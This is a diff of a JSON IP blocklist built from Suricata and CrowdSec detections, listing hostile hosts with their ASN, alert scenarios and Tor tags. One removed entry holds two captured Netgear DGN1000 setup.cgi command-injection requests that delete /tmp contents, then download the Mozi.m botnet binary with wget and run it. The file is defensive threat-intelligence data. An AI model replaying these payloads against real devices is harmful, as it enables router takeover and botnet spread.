@@ -1,65 +1,13 @@
 {
-  "generated_at": "2026-11-07T12:00:00Z",
+  "generated_at": "2026-11-08T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 60,
-    "v4": 60,
+    "total": 71,
+    "v4": 71,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "72.255.19.55",
-      "family": "v4",
-      "first_seen": "2026-10-31T18:00:00Z",
-      "last_seen": "2026-10-31T18:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "72.255.19.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://72.255.19.55:56300/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://72.255.19.55:56300/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "14.34.249.175",
-      "family": "v4",
-      "first_seen": "2026-10-31T17:00:00Z",
-      "last_seen": "2026-10-31T17:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 5"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "4766",
-      "asn_name": "KIXS-AS-KR-KR - Korea Telecom",
-      "asn_prefix": "14.32.0.0/13"
-    },
-    {
-      "ip": "172.105.69.26",
-      "family": "v4",
-      "first_seen": "2026-11-01T00:00:00Z",
-      "last_seen": "2026-11-01T00:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP unable to match response to request"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "63949",
-      "asn_name": "AKAMAI-LINODE-AP - Akamai Connected Cloud",
-      "asn_prefix": "172.105.64.0/19"
-    },
     {
       "ip": "64.227.11.104",
       "family": "v4",
@@ -1111,6 +1059,249 @@
       "asn_prefix": "35.210.0.0/16",
       "tags": [
         "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "152.32.149.35",
+      "family": "v4",
+      "first_seen": "2026-11-07T20:00:00Z",
+      "last_seen": "2026-11-07T20:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA TLS invalid SNI length"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "152.32.149.0/24"
+    },
+    {
+      "ip": "192.42.116.13",
+      "family": "v4",
+      "first_seen": "2026-11-07T18:00:00Z",
+      "last_seen": "2026-11-07T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 50"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "109.70.100.14",
+      "family": "v4",
+      "first_seen": "2026-11-07T18:00:00Z",
+      "last_seen": "2026-11-07T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 5"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "208323",
+      "asn_name": "APPLIEDPRIVACY-AS Foundation for Applied Privacy",
+      "asn_prefix": "109.70.100.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.243.218.225",
+      "family": "v4",
+      "first_seen": "2026-11-07T18:00:00Z",
+      "last_seen": "2026-11-07T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 43"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "56655",
+      "asn_name": "GIGAHOST Gigahost AS",
+      "asn_prefix": "185.243.218.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "64.190.76.10",
+      "family": "v4",
+      "first_seen": "2026-11-07T18:00:00Z",
+      "last_seen": "2026-11-07T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 114"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "214094",
+      "asn_name": "OSSERVATORIO-NESSUNO Davide Silvetti trading as 'Association Osservatorio Nessuno ODV'",
+      "asn_prefix": "64.190.76.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.101.4",
+      "family": "v4",
+      "first_seen": "2026-11-07T18:00:00Z",
+      "last_seen": "2026-11-07T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 39"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "60729",
+      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
+      "asn_prefix": "185.220.101.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "192.42.116.110",
+      "family": "v4",
+      "first_seen": "2026-11-07T18:00:00Z",
+      "last_seen": "2026-11-07T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 49"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.101.8",
+      "family": "v4",
+      "first_seen": "2026-11-07T18:00:00Z",
+      "last_seen": "2026-11-07T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 42"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "60729",
+      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
+      "asn_prefix": "185.220.101.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "165.154.41.205",
+      "family": "v4",
+      "first_seen": "2026-11-07T16:00:00Z",
+      "last_seen": "2026-11-07T16:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA TLS invalid SNI length"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "165.154.41.0/24"
+    },
+    {
+      "ip": "165.154.134.19",
+      "family": "v4",
+      "first_seen": "2026-11-07T16:00:00Z",
+      "last_seen": "2026-11-07T16:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA TLS invalid SNI length"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "165.154.134.0/24"
+    },
+    {
+      "ip": "192.42.116.92",
+      "family": "v4",
+      "first_seen": "2026-11-07T15:00:00Z",
+      "last_seen": "2026-11-07T15:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 54"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "192.42.116.21",
+      "family": "v4",
+      "first_seen": "2026-11-07T15:00:00Z",
+      "last_seen": "2026-11-07T15:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 52"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "35.210.11.30",
+      "family": "v4",
+      "first_seen": "2026-11-07T13:00:00Z",
+      "last_seen": "2026-11-07T13:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 13"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.210.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "93.152.224.190",
+      "family": "v4",
+      "first_seen": "2026-11-07T22:00:00Z",
+      "last_seen": "2026-11-07T22:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Javascript Prototype Pollution Attempt via __proto__ in HTTP Body"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "207043",
+      "asn_name": "DEDIK-IO DEDIK SERVICES LIMITED",
+      "asn_prefix": "93.152.224.0/24",
+      "payloads": [
+        "POST /"
       ]
     }
   ]
